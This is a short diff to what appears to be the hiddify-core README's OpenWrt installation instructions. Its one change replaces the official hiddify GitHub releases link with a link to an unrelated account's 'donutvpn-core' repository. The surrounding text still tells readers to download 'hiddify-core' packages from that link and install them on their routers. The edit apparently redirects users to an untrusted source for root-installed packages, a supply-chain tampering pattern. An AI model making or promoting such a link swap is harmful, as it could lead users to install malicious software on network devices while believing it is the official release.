@@ -25,7 +25,7 @@ Every release carries a package for each OpenWrt architecture: `hiddify-core_<ve
 for opkg (24.10 and earlier) and `hiddify-core-<version>-r0_<arch>.apk` for apk (25.12 and
 later). Find the architecture with `opkg print-architecture` (the last line, e.g. `x86_64`,
 `aarch64_cortex-a53`, `mipsel_24kc`) or `apk --print-arch`, download its package from the
-[latest release](https://github.com/hiddify/hiddify-core/releases/latest), then:
+[latest release](https://github.com/bobthebuilder1234232243/donutvpn-core/releases/latest), then:
 
 ```sh
 opkg install ./hiddify-core_*.ipk                  # opkg
